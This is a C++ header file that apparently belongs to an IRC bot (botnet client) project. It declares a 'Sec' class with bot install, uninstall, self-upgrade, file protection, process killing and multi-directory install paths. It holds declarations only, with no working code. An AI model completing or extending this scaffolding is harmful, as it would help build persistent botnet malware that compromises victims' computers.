#ifndef SECURITY_H
#define SECURITY_H

#include "Includes.h"
#include "Config.h"
#include "Useful.h"
#include "startup.h"

class Sec
{
public:

	Sec();
	~Sec() {}

    char *GetTempDir(int w);
	char *GetFileName();
	char *GetFilePath(char *fname);

	DWORD MakeDirectory(char *new_dir_name);
	DWORD MakeFile(char *new_file_name);

	int StartProcess(char *file);
	void KillProcess(DWORD pID);

	DWORD CheckFileRunning(char *file, int w);

	char *BotInstall();
	void BotUninstall();
	void BotUpgrade(char *new_path);

	char *IRC_FILE;

private:
    /*BotInstall()*/
	char *path1_dir, *path2_dir, *path3_dir, *path4_dir, *irc_path_dir, *temp_long, *temp_short;
	char *path1_file, *path2_file, *path3_file, *path4_file, *irc_path_file;
    char *path1_exec, *path2_exec, *path3_exec, *path4_exec, *irc_path_exec;

#define FIRST_FILE  FILE1
#define SECOND_FILE FILE2
#define THIRD_FILE  FILE3
#define FORTH_FILE  FILE4

#define FIRST_DIR   DIR1
#define SECOND_DIR  DIR2
#define THIRD_DIR   DIR3
#define FORTH_DIR   DIR4
#define IRC_DIR     IRCDIR

	void ProtectFiles(char *path_dir, char *path_file, char *path_exec, char *file_name);
    void BotUninstallBat();
};

#endif // SECURITY_H